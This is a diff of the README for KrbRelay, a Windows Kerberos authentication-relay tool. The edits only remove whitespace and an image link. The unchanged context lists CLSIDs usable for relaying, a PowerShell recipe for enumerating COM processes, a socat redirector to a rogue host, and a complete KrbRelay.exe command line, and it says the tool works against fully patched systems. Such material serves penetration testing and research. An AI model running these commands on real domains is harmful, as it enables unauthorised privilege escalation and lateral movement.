@@ -21,13 +21,10 @@
 
 ---
 
-
 Relaying 3-headed dogs.
 More details at https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html and https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
 
 This should be working on most fully patched Windows systems. There may be difficulties with Server OS in lab environments because of the firewall blocking the OXID resolver however, this will most likely not be an issue during real life engagements, same goes for CLSIDs.
-
-![image-20220213094644590](Images/image-20220213094644590.png)
 
 ### Supported Protocols and Features
 
@@ -89,8 +86,6 @@ C:\Users\domain_user\Desktop\KrbRelay\CheckPort\bin\Release\CheckPort.exe
 [*] Port: 1024 is available
 ```
 
-
-
 ## CLSIDs
 
 We'll need to unmarshal our OBJREF inside of a process that would allow authentications over the network, this can be verified by looking at the `Impersonation Level` 
@@ -114,8 +109,6 @@ $comdb = Get-CurrentComDatabase
 $clsids = (Get-ComClass).clsid
 Get-ComProcess -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll' | select ProcessId,ExecutablePath,Name,AppId,User,AuthnLevel,ImpLevel
 ```
-
-
 
 #### Windows 10 1903
 
@@ -160,8 +153,6 @@ f8842f8e-dafe-4b37-9d38-4e0714a61149 # RPC_C_IMP_LEVEL_IMPERSONATE
 bdb57ff2-79b9-4205-9447-f5fe85f37312 # RPC_C_IMP_LEVEL_IMPERSONATE
 ce0e0be8-cf56-4577-9577-34cc96ac087c # RPC_C_IMP_LEVEL_IMPERSONATE
 ```
-
-
 
 ## Error codes
 
@@ -218,7 +209,6 @@ $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.10:9999
 KrbRelay.exe -spn cifs/win10.htb.local -clsid 0289a7c5-91bf-4547-81ae-fec91a89dec5 -session 3 -rogue 10.10.14.104 -rogue-port 9999
 ````
 Also added `-skip-check` option to avoid using the `CheckPort` function, make sure to pass `-port` to force COM to listen on that port, useful when dealing with firewall.
-
 
 ### Acknowledgements
 
